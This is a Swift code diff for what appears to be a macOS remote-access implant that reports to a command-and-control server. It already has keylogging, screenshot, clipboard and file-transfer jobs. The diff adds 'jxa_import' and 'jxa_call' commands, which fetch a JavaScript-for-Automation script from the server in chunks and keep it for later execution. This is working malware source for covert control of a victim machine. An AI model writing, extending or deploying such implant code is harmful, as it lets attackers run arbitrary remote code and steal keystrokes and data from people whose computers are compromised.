@@ -42,7 +42,7 @@ class Job {
     var screenshotDisplayNumber: Int
     // keylog
     var keylogBuffer: String
-
+    
     init() {
         self.jobID = 0
         self.taskID = ""
@@ -72,6 +72,8 @@ class Job {
         self.keylogBuffer = ""
     }
 }
+// jxa_import & jxa_call
+var jxaScript = ""
 
 var capslock = false
 var keylogBuffer = ""
@@ -124,6 +126,15 @@ func getTasking(jobList: JobList) throws {
                 
                 job.uploadFileID = json["file"].stringValue
                 job.uploadFullPath = path
+            }
+        }
+        else if job.command == "jxa_import" {
+            // Clear any old JXA scripts
+            jxaScript = ""
+            
+            if let dataFromString = tasks["parameters"].stringValue.data(using: .utf8, allowLossyConversion: false) {
+                let json = try JSON(data: dataFromString)
+                job.uploadFileID = json["file"].stringValue
             }
         }
         
@@ -248,6 +259,13 @@ func executeTask(job: Job, jobList: JobList) {
         ifconfig(job: job)
     case "jxa":
         jxa(job: job)
+    case "jxa_import":
+        // Only perform the write function after the first upload response
+        if job.uploadTotalChunks >= 1 {
+            jxa_import(job: job)
+        }
+    case "jxa_call":
+        jxa_call(job: job)
     default:
         job.result = "Command not implemented."
         job.status = "error"
@@ -273,6 +291,29 @@ func postResponse(jobList: JobList) {
                 "removed_files": job.removedFiles,
             ])
             jsonJobOutput.append(jsonResponse)
+        }
+        
+        // Handle jxa_import jobs
+        if job.command == "jxa_import" {
+            // Increase chunk number, starts at 0
+            job.uploadChunkNumber += 1
+            // Get first chunk or remaining chunks
+            if ((job.uploadChunkNumber == 1) || (job.uploadChunkNumber <= job.uploadTotalChunks)) {
+                let jsonUpload = JSON([
+                    "chunk_size": 512000,
+                    "file_id": job.uploadFileID,
+                    "chunk_num": job.uploadChunkNumber,
+                ])
+                
+                let jsonResponse = JSON([
+                    "upload": jsonUpload,
+                    "user_output": job.result,
+                    "completed": job.success,
+                    "status": job.status,
+                    "task_id": job.taskID,
+                ])
+                jsonJobOutput.append(jsonResponse)
+            }
         }
         
         // Handle upload jobs
@@ -398,9 +439,26 @@ func postResponse(jobList: JobList) {
                 // Found a job that succeeded and matched with task_id
                 if responses["task_id"].stringValue == job.taskID {
                     // Delete job if it is a "normal" job
-                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard") && (job.command != "exit")) {
+                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard") && (job.command != "exit") && (job.command != "jxa_import")) {
                         jobList.jobs.remove(at: index)
                         print("job removed")
+                    }
+                    // Handle jxa_import responses
+                    else if job.command == "jxa_import" {
+                        // Save total chunks + chunk_data from first upload message
+                        if ((job.uploadTotalChunks == 0) && (responses["total_chunks"].exists())) {
+                            job.uploadTotalChunks = responses["total_chunks"].intValue
+                            job.uploadData = responses["chunk_data"].stringValue
+                        }
+                        // parse remaining upload messages
+                        else if job.uploadChunkNumber <= job.uploadTotalChunks {
+                            job.uploadData = responses["chunk_data"].stringValue
+                        }
+                        // Delete job if upload task is complete
+                        else if job.uploadChunkNumber > job.uploadTotalChunks {
+                            //job.uploadData += responses["chunk_data"].stringValue
+                            jobList.jobs.remove(at: index)
+                        }
                     }
                     // Handle exit responses
                     else if job.command == "exit" {
